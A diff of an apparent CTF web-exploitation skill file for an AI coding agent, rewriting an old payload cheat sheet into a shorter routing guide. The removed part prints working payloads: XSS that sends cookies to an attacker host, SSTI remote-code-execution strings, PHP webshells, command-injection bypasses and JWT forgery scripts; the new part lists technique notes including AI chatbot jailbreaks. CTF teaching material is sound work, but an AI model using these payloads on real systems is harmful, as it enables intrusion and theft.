@@ -1,290 +1,152 @@
 ---
 name: web
-description: >
-  Web security exploitation specialist. Covers SQL injection, XSS, SSTI, SSRF,
-  JWT attacks, file upload bypass, command injection, IDOR, CSRF, and race conditions.
+description: Provides web exploitation techniques for CTF challenges. Use when the target is primarily an HTTP application, API, browser client, template engine, identity flow, or smart-contract frontend/backend surface, including XSS, SQLi, SSTI, SSRF, XXE, JWT, auth bypass, file upload, request smuggling, OAuth/OIDC, SAML, prototype pollution, and similar web bugs. Do not use it for native binary memory corruption, reverse engineering of standalone executables, disk or memory forensics, or pure cryptanalysis unless the web flaw is still the main path to the flag.
+license: MIT
+compatibility: Requires filesystem-based agent (Claude Code or similar) with bash, Python 3, and internet access for tool installation.
+allowed-tools: Bash Read Write Edit Glob Grep Task WebFetch WebSearch
 metadata:
-  user-invocable: "true"
-  argument-hint: "[url-or-description]"
-  category: web
+  user-invocable: "false"
 ---
 
-# Web Security Exploitation
+# CTF Web Exploitation
 
-You are the web exploitation specialist for CTF challenges. Methodically probe the target, identify vulnerabilities, and exploit them to capture the flag.
+Use this skill as a routing and execution guide for web-heavy challenges. Keep the first pass short: map the app, confirm the trust boundary, and only then dive into the detailed technique notes.
 
-## Reconnaissance
+## Prerequisites
+
+**Python packages (all platforms):**
+```bash
+pip install sqlmap flask-unsign requests
+```
+
+**Linux (apt):**
+```bash
+apt install hashcat jq curl
+```
+
+**macOS (Homebrew):**
+```bash
+brew install hashcat jq curl
+```
+
+**Go tools (all platforms, requires Go):**
+```bash
+go install github.com/ffuf/ffuf/v2@latest
+```
+
+**Manual install:**
+- ysoserial — [GitHub](https://github.com/frohoff/ysoserial), requires Java (Java deserialization payloads)
+
+## Additional Resources
+
+- [sql-injection.md](sql-injection.md) - SQL injection techniques: auth bypass, UNION extraction, filter bypasses, second-order SQLi, truncation, race-assisted leaks, INSERT ON DUPLICATE KEY UPDATE password overwrite, innodb_table_stats WAF bypass
+- [server-side.md](server-side.md) - PHP type juggling, php://filter LFI, Python str.format traversal, SSTI (Jinja2, Twig, ERB, Mako, EJS, Vue.js, Smarty), SSRF (Host header, DNS rebinding, curl redirect, unescaped-dot regex, SNI FTP smuggling, mod_vhost_alias), PHP hash_hmac NULL
+- [server-side-2.md](server-side-2.md) - XXE (basic, OOB, DOCX upload), XML injection via X-Forwarded-For, PHP variable variables, PHP uniqid predictable filename, sequential regex replacement bypass, command injection (newline, blocklist, sendmail CGI, multi-barcode, git CLI), GraphQL injection (introspection, batching, interpolation)
+- [server-side-exec.md](server-side-exec.md) - Direct code execution paths, upload-to-RCE, deserialization-adjacent execution, LaTeX injection, header and API abuses
+- [server-side-exec-2.md](server-side-exec-2.md) - More execution chains: SQLi fragmentation, path parser tricks, polyglot uploads, wrapper abuse, filename injection, BMP pixel webshell with filename truncation
+- [server-side-deser.md](server-side-deser.md) - Java/Python/PHP deserialization and race-condition playbooks, PHP SoapClient CRLF SSRF via deserialization
+- [server-side-advanced.md](server-side-advanced.md) - Advanced SSRF, traversal, archive, parser, framework, and modern app-server issues, Nginx alias traversal
+- [server-side-advanced-2.md](server-side-advanced-2.md) - Docker API SSRF, Castor/XML, Apache expression reads, parser discrepancies, Windows path tricks, rogue MySQL server file read
+- [server-side-advanced-3.md](server-side-advanced-3.md) - Part 3 (CSAW/35C3/ASIS/PlaidCTF 2018): WAV polyglot upload, multi-slash URL `path.startswith` bypass, Xalan XSLT `math:random()` seed guess, SoapClient `_user_agent` CRLF method smuggling, `gopher:///` no-host URL scheme bypass, SSRF credential leak via attacker-specified outbound URL
+- [server-side-advanced-4.md](server-side-advanced-4.md) - Part 4: WeasyPrint SSRF/file read (CVE-2024-28184), MongoDB regex/$where blind oracle, Pongo2 Go template injection, ZIP PHP webshell, basename() bypass, wget CRLF SSRF→SMTP, Gopher SSRF to MySQL blind SQLi, React Server Components Flight RCE (CVE-2025-55182), AMQP/TLS interception via sslsplit+arpspoof, CairoSVG XXE, Bazaar repo reconstruction
+- [client-side.md](client-side.md) - XSS, CSRF, cache poisoning, DOM tricks, admin bot abuse, request smuggling, paywall bypass
+- [client-side-advanced.md](client-side-advanced.md) - CSP bypasses, Unicode tricks, XSSI, CSS exfiltration, browser normalization quirks, postMessage null origin bypass
+- [auth-and-access.md](auth-and-access.md) - Auth/authz bypasses, hidden endpoints, IDOR, redirect chains, subdomain takeover, AI chatbot jailbreaks
+- [auth-and-access-2.md](auth-and-access-2.md) - Part 2 (2018-era): `std::unordered_set` bucket collision auth bypass, `nodeprep.prepare` Unicode homograph username collision, SRP A=0/A=N auth bypass, ArangoDB AQL MERGE privilege escalation
+- [auth-jwt.md](auth-jwt.md) - JWT/JWE manipulation, weak secrets, header injection, key confusion, replay
+- [auth-infra.md](auth-infra.md) - OAuth/OIDC, SAML, CORS, CI/CD secrets, IdP abuse, login poisoning
+- [node-and-prototype.md](node-and-prototype.md) - Prototype pollution, JS sandbox escape, Node.js attack chains
+- [web3.md](web3.md) - Solidity and Web3 challenge notes
+- [cves.md](cves.md) - CVE-driven techniques you can match against challenge banners, headers, dependency leaks, or version strings
+- [field-notes.md](field-notes.md) - Long-form exploit notes: quick references for SQLi, XSS, LFI, JWT, SSTI, SSRF, command injection, XXE, deserialization, race conditions, auth bypass, and multi-stage chains
+
+## When to Pivot
+
+- If the target is a native binary, custom VM, or firmware image, switch to `/ctf-reverse` first.
+- If the HTTP bug only gives you code execution and the hard part becomes memory corruption or seccomp escape, switch to `/ctf-pwn`.
+- If the "web" challenge really turns on JWT math, custom MACs, or crypto primitives, switch to `/ctf-crypto`.
+- If the web challenge involves analyzing logs, PCAPs, or recovering artifacts from a web server, switch to `/ctf-forensics`.
+- If the challenge requires gathering intelligence from public web sources, DNS records, or social media before exploitation, switch to `/ctf-osint`.
+
+## First-Pass Workflow
+
+1. Identify the real boundary: browser only, backend only, mixed app, or auth flow.
+2. Capture one normal request/response pair for every major feature before fuzzing.
+3. Enumerate hidden functionality from JS bundles, response headers, routes, and alternate methods.
+4. Classify the likely bug family: injection, authz, parser mismatch, upload, trust proxy, state machine, or client-side execution.
+5. Build the smallest proof first: leak, bypass, or primitive. Save full exploit chaining for later.
+
+## Quick Start Commands
 
 ```bash
-# Directory and file discovery
-gobuster dir -u http://TARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,bak,old,sql,zip
-dirb http://TARGET /usr/share/wordlists/dirb/common.txt
-ffuf -u http://TARGET/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
+# Recon
+curl -sI https://target.com
+ffuf -u https://target.com/FUZZ -w wordlist.txt
+curl -s https://target.com/robots.txt
 
-# Technology fingerprinting
-curl -sI http://TARGET | head -20
-nikto -h http://TARGET
-whatweb http://TARGET
+# SQLi quick test
+sqlmap -u "https://target.com/page?id=1" --batch --dbs
 
-# Subdomain enumeration (if needed)
-ffuf -u http://FUZZ.TARGET -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+# JWT decode (no verification)
+echo '<token>' | cut -d. -f2 | base64 -d 2>/dev/null | jq .
+
+# Cookie decode (Flask)
+flask-unsign --decode --cookie '<cookie>'
+flask-unsign --unsign --cookie '<cookie>' --wordlist rockyou.txt
+
+# SSTI probes
+curl "https://target.com/page?name={{7*7}}"
+curl "https://target.com/page?name={{config}}"
+
+# Request inspection
+curl -v -X POST https://target.com/api -H "Content-Type: application/json" -d '{}'
 ```
 
-## SQL Injection
+## First Questions to Answer
 
-### Detection
-```bash
-# Manual probing
-curl "http://TARGET/page?id=1'" 
-curl "http://TARGET/page?id=1 OR 1=1--"
-curl "http://TARGET/page?id=1 AND 1=1--"
-curl "http://TARGET/login" -d "user=admin'--&pass=x"
-```
+- Is the flag likely in the browser, an API response, a local file, a database row, or an internal service?
+- Does the app trust user-controlled data in templates, redirects, file paths, headers, serialized objects, or background jobs?
+- Are there multiple parsers disagreeing with each other: proxy vs app, URL parser vs fetcher, sanitizer vs browser, serializer vs filter?
+- Can you turn the bug into a smaller primitive first: read one file, forge one token, call one internal endpoint, trigger one bot visit?
 
-### SQLMap
-```bash
-# Basic detection
-sqlmap -u "http://TARGET/page?id=1" --batch --dbs
+## High-Value Recon Checks
 
-# Dump specific database
-sqlmap -u "http://TARGET/page?id=1" -D dbname --tables
-sqlmap -u "http://TARGET/page?id=1" -D dbname -T tablename --dump
+- Read the HTML, inline scripts, and bundled JS before guessing the API surface.
+- Compare what the UI submits with what the backend accepts; optional JSON fields often unlock hidden paths.
+- Check obvious metadata and helper paths early: `/robots.txt`, `/sitemap.xml`, `/.well-known/`, `/admin`, `/debug`, `/.git/`, `/.env`.
+- Try alternate verbs and content types on interesting routes: `GET`, `POST`, `PUT`, `PATCH`, `TRACE`, JSON, form, multipart, XML.
+- Treat file upload, PDF/export, webhook, OAuth callback, and admin bot features as likely exploit multipliers.
 
-# POST-based injection
-sqlmap -u "http://TARGET/login" --data="user=admin&pass=test" --batch
+## Fast Pattern Map
 
-# With cookie
-sqlmap -u "http://TARGET/page?id=1" --cookie="session=abc123" --batch
+- SQL errors, odd filtering, or state-dependent DB behavior: start with [sql-injection.md](sql-injection.md).
+- Templating, file reads, SSRF, command execution, XML, or parser bugs: start with [server-side.md](server-side.md) and [server-side-exec.md](server-side-exec.md).
+- XSS, CSP bypass, admin bot, client routing, DOM issues, or scriptless exfiltration: start with [client-side.md](client-side.md).
+- Session forgery, hidden admin routes, JWT, OAuth, SAML, or weak trust boundaries: start with [auth-and-access.md](auth-and-access.md), [auth-jwt.md](auth-jwt.md), and [auth-infra.md](auth-infra.md).
+- Node.js apps, prototype pollution, VM sandboxes, or SSRF into internal services: add [node-and-prototype.md](node-and-prototype.md).
+- Smart contract frontends or blockchain-integrated apps: add [web3.md](web3.md).
 
-# WAF bypass techniques
-sqlmap -u "http://TARGET/page?id=1" --tamper=space2comment,between --random-agent
+## Common Chain Shapes
 
-# UNION-based extraction
-sqlmap -u "http://TARGET/page?id=1" --technique=U --union-cols=5
-```
+- Recon -> hidden route -> auth bypass -> internal file read -> token or flag
+- XSS or HTML injection -> admin bot -> privileged action -> secret leak
+- Traversal or upload -> config/source leak -> secret recovery -> session forgery
+- SSRF -> metadata or internal API -> credential leak -> code execution
+- SQLi or NoSQL injection -> credential bypass -> second-stage template or upload abuse
 
-### Manual UNION Injection
-```sql
-' UNION SELECT 1,2,3-- -
-' UNION SELECT table_name,2,3 FROM information_schema.tables WHERE table_schema=database()-- -
-' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='users'-- -
-' UNION SELECT username,password,3 FROM users-- -
-```
+## Deep-Dive Notes
 
-### Blind SQL Injection
-```bash
-# Boolean-based
-curl "http://TARGET/page?id=1 AND (SELECT SUBSTRING(version(),1,1))='5'"
-# Time-based
-curl "http://TARGET/page?id=1 AND SLEEP(5)-- -"
-```
+Use [field-notes.md](field-notes.md) once you have confirmed the challenge is truly web-heavy and you need the long exploit catalog.
 
-## XSS (Cross-Site Scripting)
+- Recon, SQLi, XSS, traversal, JWT, SSTI, SSRF, XXE, and command injection quick notes
+- Deserialization, race conditions, file upload to RCE, and multi-stage chain examples
+- Node, OAuth/SAML, CI/CD, Web3, bot abuse, CSP bypasses, and modern browser tricks
+- CVE-shaped playbooks and older challenge patterns that still show up in modern CTFs
 
-### Reflected XSS
-```html
-<script>alert(1)</script>
-<img src=x onerror=alert(1)>
-<svg onload=alert(1)>
-<iframe src="javascript:alert(1)">
-"><script>alert(document.cookie)</script>
-<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>
-```
+## Common Flag Locations
 
-### Cookie Stealing
-```html
-<script>new Image().src="http://ATTACKER/"+document.cookie;</script>
-<script>fetch("http://ATTACKER/?c="+document.cookie)</script>
-```
-
-### DOM XSS
-```javascript
-# Source: location.hash, location.search, document.referrer
-# Sink: innerHTML, eval, document.write, setTimeout
-# Test: http://TARGET/page#<img src=x onerror=alert(1)>
-```
-
-## SSTI (Server-Side Template Injection)
-
-### Detection
-```
-{{7*7}}          → 49 (Jinja2/Twig)
-${7*7}           → 49 (Freemarker/EL)
-#{7*7}           → 49 (Thymeleaf/Ruby ERB-like)
-<%= 7*7 %>       → 49 (ERB)
-{{config}}       → dumps config (Jinja2)
-```
-
-### Jinja2 RCE
-```python
-# Basic RCE
-{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
-{{''.__class__.__mro__[1].__subclasses__()[INDEX]('cat /flag',shell=True,stdout=-1).communicate()[0]}}
-
-# Find subprocess.Popen index
-{% for c in ''.__class__.__mro__[1].__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('/flag').read() }}{% endif %}{% endfor %}
-
-# Compact payload
-{{request.__class__.__mro__[1].__subclasses__()[INDEX]('cat /flag',shell=True,stdout=-1).communicate()[0]}}
-{{lipsum.__globals__['os'].popen('cat /flag').read()}}
-{{cycler.__init__.__globals__.os.popen('cat /flag').read()}}
-```
-
-### Twig RCE
-```
-{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /flag")}}
-{{['cat /flag']|filter('system')}}
-```
-
-### ERB RCE
-```erb
-<%= system('cat /flag') %>
-<%= `cat /flag` %>
-<%= File.open('/flag').read %>
-```
-
-## SSRF (Server-Side Request Forgery)
-
-```bash
-# Internal service access
-curl "http://TARGET/fetch?url=http://localhost:80"
-curl "http://TARGET/fetch?url=http://127.0.0.1:8080/admin"
-curl "http://TARGET/fetch?url=http://169.254.169.254/latest/meta-data/"  # AWS metadata
-
-# Bypass filters
-http://0x7f000001/          # hex IP
-http://0177.0.0.1/          # octal IP
-http://[::1]/               # IPv6 loopback
-http://127.1/               # shortened
-http://127.0.0.1.nip.io/    # DNS rebinding
-```
-
-## JWT Attacks
-
-### Decode JWT
-```bash
-# Cut and base64 decode
-echo "HEADER" | base64 -d 2>/dev/null; echo
-echo "PAYLOAD" | base64 -d 2>/dev/null; echo
-# Or use jwt-cli
-jwt decode TOKEN
-```
-
-### alg: none Attack
-```python
-import base64, json
-
-header = base64.urlsafe_b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).rstrip(b'=').decode()
-payload = base64.urlsafe_b64encode(json.dumps({"user":"admin","role":"admin"}).encode()).rstrip(b'=').decode()
-token = f"{header}.{payload}."
-print(token)
-```
-
-### Weak Secret Brute Force
-```bash
-# Using hashcat
-hashcat -m 16500 jwt_token.txt /usr/share/wordlists/rockyou.txt
-# Using jwt-cracker
-jwt-cracker "TOKEN" "abc123" 6
-```
-
-### Key Confusion (RS256 → HS256)
-```python
-import jwt
-public_key = open("public.pem").read()
-token = jwt.encode({"user":"admin"}, public_key, algorithm="HS256")
-print(token)
-```
-
-## File Upload Bypass
-
-```bash
-# Extension bypass: .php5, .phtml, .phar, .php.jpg, .php%00.png
-# Content-Type bypass: change to image/jpeg, image/png
-# Magic bytes: prepend GIF89a to PHP file
-# Double extension: shell.php.jpg (with Apache misconfig)
-# .htaccess upload:
-echo "AddType application/x-httpd-php .jpg" > .htaccess
-
-# Webshell payloads
-<?php system($_GET['cmd']); ?>
-<?= system($_GET['cmd']); ?>
-<script language="php">system($_GET['cmd']);</script>
-```
-
-## Command Injection
-
-```bash
-# Basic injection
-; cat /flag
-| cat /flag
-$(cat /flag)
-`cat /flag`
-&& cat /flag
-|| cat /flag
-
-# Bypass spaces
-cat${IFS}/flag
-cat$IFS/flag
-{cat,/flag}
-cat</flag
-
-# Bypass filters
-c'a't /flag       # quoting
-c\at /flag        # escaping
-/bin/c?t /flag    # globbing
-```
-
-## IDOR (Insecure Direct Object Reference)
-
-```bash
-# Iterate over IDs
-for i in $(seq 1 100); do
-  curl -s -b "session=TOKEN" "http://TARGET/api/user/$i" | grep -i flag
-done
-
-# UUID brute force if predictable
-ffuf -u "http://TARGET/api/user/FUZZ" -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt
-```
-
-## CSRF
-
-```html
-<form action="http://TARGET/action" method="POST">
-  <input type="hidden" name="param" value="exploit">
-</form>
-<script>document.forms[0].submit();</script>
-```
-
-## Race Conditions
-
-```bash
-# Using burp intruder or turbo intruder
-# Or parallel curl requests
-for i in $(seq 1 20); do
-  curl -s -b "session=TOKEN" "http://TARGET/transfer?to=attacker&amount=1000" &
-done
-wait
-```
-
-## Common CTF Flags Locations
-
-```
-/flag, /flag.txt, /root/flag.txt
-Environment variables: env, printenv
-Database: flags table, config table
-Cookies (base64/encrypted)
-Source code comments
-robots.txt, .git/, .env, .svn/
-```
-
-## Quick Reference
-
-| Technique | Tool | Command |
-|-----------|------|---------|
-| SQLi | sqlmap | `sqlmap -u URL --batch --dbs` |
-| Dir brute | gobuster | `gobuster dir -u URL -w WORDLIST` |
-| XSS test | manual | `<script>alert(1)</script>` |
-| SSTI test | manual | `{{7*7}}` |
-| JWT crack | hashcat | `hashcat -m 16500 token wordlist` |
-| SSRF | curl | `curl URL?url=http://127.0.0.1` |
+- Files: `/flag.txt`, `/flag`, `/app/flag.txt`, `/home/*/flag*`
+- Environment: `/proc/self/environ`, process command line, debug config dumps
+- Database: tables named `flag`, `flags`, `secret`, or seeded challenge content
+- HTTP: custom headers, archived responses, hidden routes, admin exports
+- Browser: hidden DOM nodes, `data-*` attributes, inline state objects, source maps
